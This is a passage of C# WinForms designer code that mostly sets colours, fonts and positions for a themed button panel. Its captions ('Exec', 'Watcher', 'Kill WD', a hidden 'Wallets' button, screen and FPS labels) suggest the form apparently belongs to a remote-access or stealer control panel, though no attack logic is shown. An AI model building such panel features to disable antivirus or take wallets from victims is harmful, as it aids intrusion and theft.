            this.studioButton11.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton11.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton11.Image = null;
            this.studioButton11.Location = new System.Drawing.Point(4, 275);
            this.studioButton11.Name = "studioButton11";
            this.studioButton11.NoRounding = false;
            this.studioButton11.Size = new System.Drawing.Size(94, 25);
            this.studioButton11.TabIndex = 83;
            this.studioButton11.Text = "Rescale";
            this.studioButton11.Transparent = true;
            this.studioButton11.Click += new System.EventHandler(this.studioButton11_Click);
            // 
            // CloseBtn
            // 
            this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.CloseBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.CloseBtn.Location = new System.Drawing.Point(64, 11);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.Size = new System.Drawing.Size(26, 26);
            this.CloseBtn.TabIndex = 11;
            this.CloseBtn.UseVisualStyleBackColor = true;
            this.CloseBtn.Click += new System.EventHandler(this.CloseBtn_Click);
            // 
            // studioButton10
            // 
            this.studioButton10.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton10.BackColor = System.Drawing.Color.Transparent;
            bloom76.Name = "DownGradient1";
            bloom76.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom77.Name = "DownGradient2";
            bloom77.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom78.Name = "NoneGradient1";
            bloom78.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom79.Name = "NoneGradient2";
            bloom79.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom80.Name = "Shine1";
            bloom80.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom81.Name = "Shine2A";
            bloom81.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom82.Name = "Shine2B";
            bloom82.Value = System.Drawing.Color.Transparent;
            bloom83.Name = "Shine3";
            bloom83.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom84.Name = "TextShade";
            bloom84.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom85.Name = "Text";
            bloom85.Value = System.Drawing.Color.White;
            bloom86.Name = "Glow";
            bloom86.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom87.Name = "Border";
            bloom87.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom88.Name = "Corners";
            bloom88.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton10.Colors = new BirdBrainmofo.Bloom[] {
        bloom76,
        bloom77,
        bloom78,
        bloom79,
        bloom80,
        bloom81,
        bloom82,
        bloom83,
        bloom84,
        bloom85,
        bloom86,
        bloom87,
        bloom88};
            this.studioButton10.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton10.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton10.Image = null;
            this.studioButton10.Location = new System.Drawing.Point(4, 143);
            this.studioButton10.Name = "studioButton10";
            this.studioButton10.NoRounding = false;
            this.studioButton10.Size = new System.Drawing.Size(94, 25);
            this.studioButton10.TabIndex = 82;
            this.studioButton10.Text = "Recovery";
            this.studioButton10.Transparent = true;
            this.studioButton10.Click += new System.EventHandler(this.studioButton10_Click);
            // 
            // RestoreMaxBtn
            // 
            this.RestoreMaxBtn.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.RestoreMaxBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.RestoreMaxBtn.Location = new System.Drawing.Point(38, 11);
            this.RestoreMaxBtn.Name = "RestoreMaxBtn";
            this.RestoreMaxBtn.Size = new System.Drawing.Size(26, 26);
            this.RestoreMaxBtn.TabIndex = 12;
            this.RestoreMaxBtn.UseVisualStyleBackColor = true;
            this.RestoreMaxBtn.Click += new System.EventHandler(this.RestoreMaxBtn_Click);
            // 
            // studioButton8
            // 
            this.studioButton8.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton8.BackColor = System.Drawing.Color.Transparent;
            bloom89.Name = "DownGradient1";
            bloom89.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom90.Name = "DownGradient2";
            bloom90.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom91.Name = "NoneGradient1";
            bloom91.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom92.Name = "NoneGradient2";
            bloom92.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom93.Name = "Shine1";
            bloom93.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom94.Name = "Shine2A";
            bloom94.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom95.Name = "Shine2B";
            bloom95.Value = System.Drawing.Color.Transparent;
            bloom96.Name = "Shine3";
            bloom96.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom97.Name = "TextShade";
            bloom97.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom98.Name = "Text";
            bloom98.Value = System.Drawing.Color.White;
            bloom99.Name = "Glow";
            bloom99.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom100.Name = "Border";
            bloom100.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom101.Name = "Corners";
            bloom101.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton8.Colors = new BirdBrainmofo.Bloom[] {
        bloom89,
        bloom90,
        bloom91,
        bloom92,
        bloom93,
        bloom94,
        bloom95,
        bloom96,
        bloom97,
        bloom98,
        bloom99,
        bloom100,
        bloom101};
            this.studioButton8.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton8.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton8.Image = null;
            this.studioButton8.Location = new System.Drawing.Point(4, 308);
            this.studioButton8.Name = "studioButton8";
            this.studioButton8.NoRounding = false;
            this.studioButton8.Size = new System.Drawing.Size(94, 25);
            this.studioButton8.TabIndex = 81;
            this.studioButton8.Text = "Help";
            this.studioButton8.Transparent = true;
            this.studioButton8.Click += new System.EventHandler(this.studioButton8_Click_1);
            // 
            // studioButton1
            // 
            this.studioButton1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton1.BackColor = System.Drawing.Color.Transparent;
            bloom102.Name = "DownGradient1";
            bloom102.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom103.Name = "DownGradient2";
            bloom103.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom104.Name = "NoneGradient1";
            bloom104.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom105.Name = "NoneGradient2";
            bloom105.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom106.Name = "Shine1";
            bloom106.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom107.Name = "Shine2A";
            bloom107.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom108.Name = "Shine2B";
            bloom108.Value = System.Drawing.Color.Transparent;
            bloom109.Name = "Shine3";
            bloom109.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom110.Name = "TextShade";
            bloom110.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom111.Name = "Text";
            bloom111.Value = System.Drawing.Color.White;
            bloom112.Name = "Glow";
            bloom112.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom113.Name = "Border";
            bloom113.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom114.Name = "Corners";
            bloom114.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton1.Colors = new BirdBrainmofo.Bloom[] {
        bloom102,
        bloom103,
        bloom104,
        bloom105,
        bloom106,
        bloom107,
        bloom108,
        bloom109,
        bloom110,
        bloom111,
        bloom112,
        bloom113,
        bloom114};
            this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton1.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton1.Image = null;
            this.studioButton1.Location = new System.Drawing.Point(4, 176);
            this.studioButton1.Name = "studioButton1";
            this.studioButton1.NoRounding = false;
            this.studioButton1.Size = new System.Drawing.Size(94, 25);
            this.studioButton1.TabIndex = 64;
            this.studioButton1.Text = "Exec";
            this.studioButton1.Transparent = true;
            this.studioButton1.Click += new System.EventHandler(this.studioButton1_Click);
            // 
            // studioButton6
            // 
            this.studioButton6.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton6.BackColor = System.Drawing.Color.Transparent;
            bloom115.Name = "DownGradient1";
            bloom115.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom116.Name = "DownGradient2";
            bloom116.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom117.Name = "NoneGradient1";
            bloom117.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom118.Name = "NoneGradient2";
            bloom118.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom119.Name = "Shine1";
            bloom119.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom120.Name = "Shine2A";
            bloom120.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom121.Name = "Shine2B";
            bloom121.Value = System.Drawing.Color.Transparent;
            bloom122.Name = "Shine3";
            bloom122.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom123.Name = "TextShade";
            bloom123.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom124.Name = "Text";
            bloom124.Value = System.Drawing.Color.White;
            bloom125.Name = "Glow";
            bloom125.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom126.Name = "Border";
            bloom126.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom127.Name = "Corners";
            bloom127.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton6.Colors = new BirdBrainmofo.Bloom[] {
        bloom115,
        bloom116,
        bloom117,
        bloom118,
        bloom119,
        bloom120,
        bloom121,
        bloom122,
        bloom123,
        bloom124,
        bloom125,
        bloom126,
        bloom127};
            this.studioButton6.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton6.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton6.Image = null;
            this.studioButton6.Location = new System.Drawing.Point(4, 374);
            this.studioButton6.Name = "studioButton6";
            this.studioButton6.NoRounding = false;
            this.studioButton6.Size = new System.Drawing.Size(94, 25);
            this.studioButton6.TabIndex = 74;
            this.studioButton6.Text = "Wallets";
            this.studioButton6.Transparent = true;
            this.studioButton6.Visible = false;
            this.studioButton6.Click += new System.EventHandler(this.studioButton6_Click);
            // 
            // btnWatcher
            // 
            this.btnWatcher.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnWatcher.BackColor = System.Drawing.Color.Transparent;
            bloom128.Name = "DownGradient1";
            bloom128.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom129.Name = "DownGradient2";
            bloom129.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom130.Name = "NoneGradient1";
            bloom130.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom131.Name = "NoneGradient2";
            bloom131.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom132.Name = "Shine1";
            bloom132.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom133.Name = "Shine2A";
            bloom133.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom134.Name = "Shine2B";
            bloom134.Value = System.Drawing.Color.Transparent;
            bloom135.Name = "Shine3";
            bloom135.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom136.Name = "TextShade";
            bloom136.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom137.Name = "Text";
            bloom137.Value = System.Drawing.Color.White;
            bloom138.Name = "Glow";
            bloom138.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom139.Name = "Border";
            bloom139.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom140.Name = "Corners";
            bloom140.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.btnWatcher.Colors = new BirdBrainmofo.Bloom[] {
        bloom128,
        bloom129,
        bloom130,
        bloom131,
        bloom132,
        bloom133,
        bloom134,
        bloom135,
        bloom136,
        bloom137,
        bloom138,
        bloom139,
        bloom140};
            this.btnWatcher.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnWatcher.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnWatcher.Image = null;
            this.btnWatcher.Location = new System.Drawing.Point(4, 209);
            this.btnWatcher.Name = "btnWatcher";
            this.btnWatcher.NoRounding = false;
            this.btnWatcher.Size = new System.Drawing.Size(94, 25);
            this.btnWatcher.TabIndex = 70;
            this.btnWatcher.Text = "Watcher";
            this.btnWatcher.Transparent = true;
            this.btnWatcher.Click += new System.EventHandler(this.btnWatcher_Click);
            // 
            // btnElectrum
            // 
            this.btnElectrum.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnElectrum.BackColor = System.Drawing.Color.Transparent;
            bloom141.Name = "DownGradient1";
            bloom141.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom142.Name = "DownGradient2";
            bloom142.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom143.Name = "NoneGradient1";
            bloom143.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom144.Name = "NoneGradient2";
            bloom144.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom145.Name = "Shine1";
            bloom145.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom146.Name = "Shine2A";
            bloom146.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom147.Name = "Shine2B";
            bloom147.Value = System.Drawing.Color.Transparent;
            bloom148.Name = "Shine3";
            bloom148.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom149.Name = "TextShade";
            bloom149.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom150.Name = "Text";
            bloom150.Value = System.Drawing.Color.White;
            bloom151.Name = "Glow";
            bloom151.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom152.Name = "Border";
            bloom152.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom153.Name = "Corners";
            bloom153.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.btnElectrum.Colors = new BirdBrainmofo.Bloom[] {
        bloom141,
        bloom142,
        bloom143,
        bloom144,
        bloom145,
        bloom146,
        bloom147,
        bloom148,
        bloom149,
        bloom150,
        bloom151,
        bloom152,
        bloom153};
            this.btnElectrum.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnElectrum.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnElectrum.Image = null;
            this.btnElectrum.Location = new System.Drawing.Point(4, 242);
            this.btnElectrum.Name = "btnElectrum";
            this.btnElectrum.NoRounding = false;
            this.btnElectrum.Size = new System.Drawing.Size(94, 25);
            this.btnElectrum.TabIndex = 72;
            this.btnElectrum.Text = "Kill WD";
            this.btnElectrum.Transparent = true;
            this.btnElectrum.Click += new System.EventHandler(this.studioButton2_Click);
            // 
            // txtScreen
            // 
            this.txtScreen.AutoSize = true;
            this.txtScreen.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtScreen.Location = new System.Drawing.Point(593, 730);
            this.txtScreen.Name = "txtScreen";
            this.txtScreen.Size = new System.Drawing.Size(56, 13);
            this.txtScreen.TabIndex = 112;
            this.txtScreen.Text = "SCREEN";
            this.txtScreen.Visible = false;
            // 
            // txtFPS
            // 
            this.txtFPS.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.txtFPS.AutoSize = true;
            this.txtFPS.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtFPS.ForeColor = System.Drawing.Color.SteelBlue;
            this.txtFPS.Location = new System.Drawing.Point(829, 698);
            this.txtFPS.Name = "txtFPS";
            this.txtFPS.Size = new System.Drawing.Size(31, 13);
            this.txtFPS.TabIndex = 111;
            this.txtFPS.Text = "FPS";
            // 
            // studioButton2
            // 
            this.studioButton2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton2.BackColor = System.Drawing.Color.Transparent;
            bloom154.Name = "DownGradient1";
            bloom154.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom155.Name = "DownGradient2";
            bloom155.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom156.Name = "NoneGradient1";
            bloom156.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom157.Name = "NoneGradient2";
            bloom157.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom158.Name = "Shine1";
            bloom158.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom159.Name = "Shine2A";
            bloom159.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom160.Name = "Shine2B";
            bloom160.Value = System.Drawing.Color.Transparent;
            bloom161.Name = "Shine3";
            bloom161.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom162.Name = "TextShade";
            bloom162.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom163.Name = "Text";
            bloom163.Value = System.Drawing.Color.White;
            bloom164.Name = "Glow";
            bloom164.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom165.Name = "Border";
            bloom165.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom166.Name = "Corners";
            bloom166.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton2.Colors = new BirdBrainmofo.Bloom[] {
        bloom154,
        bloom155,
        bloom156,
        bloom157,
        bloom158,
        bloom159,
        bloom160,
        bloom161,
        bloom162,
        bloom163,
        bloom164,
        bloom165,
        bloom166};
            this.studioButton2.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton2.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton2.Image = null;
            this.studioButton2.Location = new System.Drawing.Point(1124, -5);
            this.studioButton2.Name = "studioButton2";
            this.studioButton2.NoRounding = false;
            this.studioButton2.Size = new System.Drawing.Size(13, 30);
            this.studioButton2.TabIndex = 73;
            this.studioButton2.Transparent = true;
            this.studioButton2.Click += new System.EventHandler(this.studioButton2_Click_1);
            // 
            // studioButton5
            // 
            this.studioButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom167.Name = "DownGradient1";
            bloom167.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom168.Name = "DownGradient2";
            bloom168.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom169.Name = "NoneGradient1";
            bloom169.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom170.Name = "NoneGradient2";
            bloom170.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom171.Name = "Shine1";
            bloom171.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom172.Name = "Shine2A";
            bloom172.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom173.Name = "Shine2B";
            bloom173.Value = System.Drawing.Color.Transparent;
            bloom174.Name = "Shine3";
            bloom174.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom175.Name = "TextShade";
            bloom175.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom176.Name = "Text";
            bloom176.Value = System.Drawing.Color.White;
            bloom177.Name = "Glow";
            bloom177.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom178.Name = "Border";
            bloom178.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom179.Name = "Corners";
            bloom179.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton5.Colors = new BirdBrainmofo.Bloom[] {
        bloom167,
        bloom168,
        bloom169,
        bloom170,
        bloom171,
        bloom172,
        bloom173,
        bloom174,
        bloom175,
        bloom176,
        bloom177,
        bloom178,
        bloom179};
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(1181, -5);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 39;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(this.studioButton5_Click);
            // 
            // studioButton4
            // 
            this.studioButton4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton4.BackColor = System.Drawing.Color.Transparent;
            bloom180.Name = "DownGradient1";
            bloom180.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom181.Name = "DownGradient2";
            bloom181.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom182.Name = "NoneGradient1";
            bloom182.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom183.Name = "NoneGradient2";
            bloom183.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom184.Name = "Shine1";
            bloom184.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom185.Name = "Shine2A";
            bloom185.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom186.Name = "Shine2B";
            bloom186.Value = System.Drawing.Color.Transparent;
            bloom187.Name = "Shine3";
            bloom187.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom188.Name = "TextShade";
